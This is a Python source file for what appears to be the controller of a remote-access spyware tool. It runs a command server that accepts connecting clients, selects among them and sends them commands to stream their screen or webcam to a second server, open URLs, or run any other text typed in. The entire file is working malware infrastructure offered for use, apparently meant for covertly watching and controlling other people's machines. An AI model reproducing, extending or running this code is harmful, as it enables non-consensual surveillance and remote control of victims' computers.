import threading
import socket
from vidstream import StreamingServer
from colorama import Fore, Style, init

# Initialize colorama for cross-platform support
init(autoreset=True)

# Global variables to control the servers
stream_server = None
command_server = None
clients = []
stream_server_thread = None
client_lock = threading.Lock()
selected_client = None

# Dictionary of allowed commands and their descriptions
commands = {
    "start stream": "Start the streaming server",
    "start camera": "Start the camera streaming server",
    "stop stream": "Stop the streaming server",
    "stop camera": "Stop the camera streaming server",
    "stop": "Stop both the streaming and command servers",
    "open url": "Open web browser with URL (e.g. open url https://example.com)",
    "open url headless": "Open URL without browser (e.g. open url headless https://example.com)",
    "show clients": "Display a list of connected clients",
    "select client": "Select a client to send commands to (e.g. select client 1)",
    "help": "Display this help message",
}


class Colors:
    HEADER = Fore.CYAN + Style.BRIGHT
    BLUE = Fore.BLUE + Style.BRIGHT
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    RESET = Style.RESET_ALL


def ascii_banner():
    """Prints the ASCII banner."""
    print(
        Colors.HEADER
        + """
 ░▒▓███████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  
 ░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  
       ░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  
░▒▓███████▓▒░░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  
              made by mo0hie
    """
        + Colors.RESET
    )
    show_help()


def show_help():
    """Displays the list of available commands in a table format."""
    print("\n" + Colors.YELLOW + "Available Commands:")
    print(Colors.BLUE + "{:<20} {:<50}".format("Command", "Description"))
    print(Colors.GREEN + "-" * 70)
    for command, description in commands.items():
        print(Colors.BLUE + "{:<20} {:<50}".format(command, description))
    print(Colors.GREEN + "-" * 70 + "\n")


def handle_client(client_socket, client_id):
    """Handles communication with a connected client."""
    global selected_client
    with client_lock:
        clients.append((client_id, client_socket))
    try:
        while True:
            command = input(
                Colors.YELLOW + f"Enter command to send to client {client_id}: "
            ).strip()
            if command.lower() == "stop":
                client_socket.send(command.encode())
                print(Colors.RED + "Stopping command server.")
                break
            elif command == "show clients":
                list_clients()
            elif command.startswith("select client"):
                parts = command.split()
                if len(parts) == 3 and parts[2].isdigit():
                    new_client_id = int(parts[2])
                    select_client(new_client_id)
                else:
                    print(Colors.RED + "Invalid format. Use 'select client <ID>'.")
            elif command.strip().lower() == "help":
                show_help()
            elif command.startswith("open url headless") or command.startswith(
                "open url"
            ):
                parts = command.split(" ", 2)
                if len(parts) == 3:
                    client_socket.send(command.encode())
                else:
                    print(
                        Colors.RED
                        + "Invalid command format. Use 'open url <URL>' or 'open url headless <URL>'."
                    )
            elif command.lower() == "start stream" or command.lower() == "start camera":
                start_stream_server()
                client_socket.send(command.encode())
            elif command.lower() == "stop stream" or command.lower() == "stop camera":
                stop_stream_server()
                client_socket.send(command.encode())
            else:
                if command.strip() != "":
                    send_command_to_client(command)
    except (ConnectionResetError, BrokenPipeError):
        print(Colors.RED + f"\nClient {client_id} disconnected.")
    finally:
        client_socket.close()
        with client_lock:
            clients.remove((client_id, client_socket))
            if selected_client == client_id:
                select_next_client()
        list_clients()


def select_next_client():
    """Selects the next available client after a disconnection."""
    global selected_client
    with client_lock:
        if clients:
            next_client = clients[0]
            selected_client = next_client[0]
            print(Colors.GREEN + f"Automatically selected client {selected_client}")
        else:
            selected_client = None
            print(Colors.YELLOW + "No more clients connected.")


def select_client(client_id):
    """Selects a client by ID to send commands to."""
    global selected_client
    with client_lock:
        for cid, client_socket in clients:
            if cid == client_id:
                selected_client = client_id
                print(
                    Colors.GREEN
                    + f"Selected client {client_id} for sending commands.\n"
                )
                return
        print(Colors.RED + f"Client ID {client_id} not found.\n")


def list_clients():
    """Lists all connected clients."""
    with client_lock:
        if not clients:
            print(Colors.YELLOW + "No clients connected.")
            return
        print(Colors.YELLOW + "\nConnected Clients:")
        print(
            Colors.BLUE
            + "{:<10} {:<20} {:<10}".format("Client ID", "Address", "Selected")
        )
        print(Colors.GREEN + "-" * 40)
        for client_id, client_socket in clients:
            address = client_socket.getpeername()
            is_selected = "Yes" if client_id == selected_client else "No"
            print(
                Colors.BLUE
                + "{:<10} {:<20} {:<10}".format(
                    client_id, f"{address[0]}:{address[1]}", is_selected
                )
            )
        print(Colors.GREEN + "-" * 40 + "\n")


def send_command_to_client(command):
    """Sends a command to the currently selected client."""
    global selected_client
    list_clients()
    with client_lock:
        for client_id, client_socket in clients:
            if client_id == selected_client:
                try:
                    client_socket.send((command + "\n").encode())
                    print(Colors.GREEN + f"Command sent to client {selected_client}")
                except (ConnectionResetError, BrokenPipeError):
                    print(Colors.RED + f"\nClient {selected_client} disconnected.")
                    clients.remove((client_id, client_socket))
                    select_next_client()
                return
        print(Colors.RED + "Selected client not found. It may have disconnected.")
        selected_client = None
        list_clients()


def start_stream_server():
    """Starts the streaming server."""
    print(Colors.GREEN + "Starting Stream Server")
    global stream_server
    global stream_server_thread
    if stream_server is None:
        stream_server = StreamingServer("0.0.0.0", 9998)
        stream_server_thread = threading.Thread(target=stream_server.start_server)
        stream_server_thread.start()
        print(Colors.GREEN + "Streaming server started on port 9998.")
    else:
        print(Colors.YELLOW + "Streaming server is already running.")


def stop_stream_server():
    """Stops the streaming server."""
    global stream_server
    if stream_server is not None:
        stream_server.stop_server()
        stream_server = None
        print(Colors.RED + "Streaming server stopped.")
    else:
        print(Colors.YELLOW + "Streaming server is not running")


def server_thread_function():
    """Function for handling commands and managing the server."""
    global command_server
    command_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    command_server.bind(("0.0.0.0", 9999))
    command_server.listen(5)
    print(Colors.GREEN + "Command server listening on port 9999")
    try:
        while True:
            client_socket, addr = command_server.accept()
            client_id = len(clients) + 1
            print(Colors.GREEN + f"Accepted connection from {addr}")
            client_thread = threading.Thread(
                target=handle_client, args=(client_socket, client_id)
            )
            client_thread.start()
    except KeyboardInterrupt:
        print(Colors.RED + "Shutting down the server.")
    finally:
        command_server.close()
        stop_stream_server()


if __name__ == "__main__":
    ascii_banner()
    server_thread_function()
